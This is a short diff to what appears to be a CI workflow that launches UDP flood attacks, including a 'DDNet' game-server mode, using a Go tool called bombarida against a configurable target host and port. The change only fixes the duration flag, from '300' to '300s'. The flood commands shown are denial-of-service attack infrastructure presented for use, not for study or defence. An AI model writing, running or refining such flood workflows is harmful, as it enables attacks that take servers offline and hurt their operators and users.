@@ -71,10 +71,10 @@ jobs:
           elif [ "$METHOD" == "udp" ]; then
             echo "Запуск обычного UDP flood (bombarida)"
             go run bombarida.go -mode client -addr "${TARGET}:${PORT}" \
-              -c $CONNS -n 0 -d 300 -r 0 -t 1s
+              -c $CONNS -n 0 -d 300s -r 0 -t 1s
 
           elif [ "$METHOD" == "udp-ddnet" ]; then
             echo "Запуск UDP DDNet mode (bombarida)"
             go run bombarida.go -mode client -addr "${TARGET}:${PORT}" \
-              -ddnet-info -open-loop -c $CONNS -n 0 -d 300 -r 0 -t 1s
+              -ddnet-info -open-loop -c $CONNS -n 0 -d 300s -r 0 -t 1s
           fi
